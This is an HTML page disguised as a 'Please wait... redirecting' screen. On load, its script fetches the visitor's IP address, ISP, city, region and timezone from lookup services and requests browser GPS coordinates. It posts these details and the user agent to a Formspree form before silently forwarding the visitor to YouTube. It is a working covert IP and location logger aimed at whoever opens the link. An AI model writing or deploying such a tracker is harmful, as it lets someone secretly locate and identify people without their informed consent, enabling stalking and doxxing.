<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Redirecting...</title>
  <style>
    body {
      font-family: Arial;
      text-align: center;
      padding: 50px;
      background-color: #f4f4f4;
    }
    .box {
      display: inline-block;
      padding: 20px;
      background: white;
      border-radius: 10px;
      box-shadow: 0 0 10px #ccc;
    }
  </style>
</head>
<body>
  <div class="box">
    <h2>Please wait...</h2>
    <p>Tracking and redirecting...</p>
  </div>

<script>
async function getVisitorData() {
  try {
    // IP from ipify
    const ipRes = await fetch('https://api64.ipify.org?format=json');
    const ipJson = await ipRes.json();
    const ip = ipJson.ip;

    // Location from ipwhois
    const locRes = await fetch(`https://ipwhois.app/json/${ip}`);
    const locData = await locRes.json();

    // GPS from browser
    let latitude = 'Not allowed';
    let longitude = 'Not allowed';

    if (navigator.geolocation) {
      try {
        const geo = await new Promise((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
        });
        latitude = geo.coords.latitude;
        longitude = geo.coords.longitude;
      } catch (err) {
        // permission denied or error
      }
    }

    // Prepare data
    const data = {
      ip: ip,
      isp: locData.org || 'N/A',
      country: locData.country || 'N/A',
      city: locData.city || 'N/A',
      region: locData.region || 'N/A',
      timezone: locData.timezone || 'N/A',
      latitude: latitude,
      longitude: longitude,
      user_agent: navigator.userAgent
    };

    // Send to Formspree
    await fetch("https://formspree.io/f/mldnbqvo", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data)
    });

  } catch (e) {
    console.error('Tracking error:', e);
  } finally {
    window.location.href = "https://youtube.com"; // এখানেই redirect হবে
  }
}

window.onload = getVisitorData;
</script>
</body>
</html>
